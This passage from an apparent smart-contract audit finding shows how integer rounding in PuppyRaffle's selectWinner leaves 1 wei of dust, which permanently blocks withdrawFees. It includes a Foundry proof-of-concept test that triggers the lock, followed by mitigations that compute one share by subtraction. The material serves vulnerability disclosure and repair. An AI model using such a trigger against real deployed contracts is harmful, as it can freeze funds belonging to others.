- Call selectWinner: prizePool=(4*80)/100=3, fee=(4*20)/100=0; 1 wei dust remains in contract, totalFees increased by 0.
- Call withdrawFees: require(address(this).balance == totalFees) fails (1 != 0), reverting and permanently blocking fee withdrawal.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RoundingDustTest is Test {
    PuppyRaffle raffle;
    address treasury = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        // entranceFee = 1 wei (not divisible by 5), duration = 0 so we can draw immediately
        raffle = new PuppyRaffle(1, treasury, 0);
        vm.deal(attacker, 10);
    }

    function test_RoundingDustBlocksWithdrawFees() public {
        // Enter 4 unique players
        address[] memory entrants = new address[](4);
        entrants[0] = address(1);
        entrants[1] = address(2);
        entrants[2] = address(3);
        entrants[3] = address(4);

        vm.prank(attacker);
        raffle.enterRaffle{value: 4}(entrants); // totalAmountCollected = 4

        // Draw winner (duration = 0)
        raffle.selectWinner();

        // prizePool = 3, fee = 0, dust = 1 wei remains
        assertEq(address(raffle).balance, 1);
        assertEq(uint256(raffle.totalFees()), 0);

        // withdrawFees reverts because balance != totalFees (1 != 0)
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Compute one leg by subtraction to conserve totals: e.g., fee = totalAmountCollected - prizePool; or prizePool = totalAmountCollected - fee after computing the other with division.
- Example fix:
  uint256 fee = (totalAmountCollected * 20) / 100;
  uint256 prizePool = totalAmountCollected - fee;
  // or swap order, but always use subtraction for the second leg.
- Alternatively, track and add the rounding remainder explicitly: uint256 remainder = totalAmountCollected - prizePool - fee; totalFees += uint64(fee + remainder);



